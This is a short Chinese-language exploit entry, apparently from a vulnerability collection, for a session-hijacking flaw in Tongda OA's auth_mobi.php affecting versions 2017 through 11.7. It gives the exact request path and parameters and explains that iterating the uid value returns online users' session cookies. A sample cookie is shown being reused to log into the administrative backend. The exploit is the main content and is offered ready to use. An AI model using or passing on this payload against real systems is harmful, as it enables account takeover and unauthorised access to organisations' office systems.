# 通达OAauth_mobi.php在线用户登录漏洞

- **系统**：通达OA　|　**类型**：其他　|　**CVE**：—
- **请求**：`http://xxx.xxx.xxx.xxx/general/`

**请求体 / payload**
```
exp：
/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
访问该链接，当管理员离线时则访问漏洞页面出现如下图，遍历uid可获取其他在线用户权限。
当管理员在线时会返回cookie
Cookie:PHPSESSIOD:6rdvpsrct6bcub88e5um52j6g6
利用返回的cookie参数登录后台
Cookie:PHPSESSIOD:6rdvpsrct6bcub88e5um52j6g6
>
```

**其他**
- 通达OA auth_mobi.php在线用户登录漏洞: + 漏洞简介
+ 影响版本
+ 漏洞复现
---
- 版本: + 通达OA2017-通达OA11.7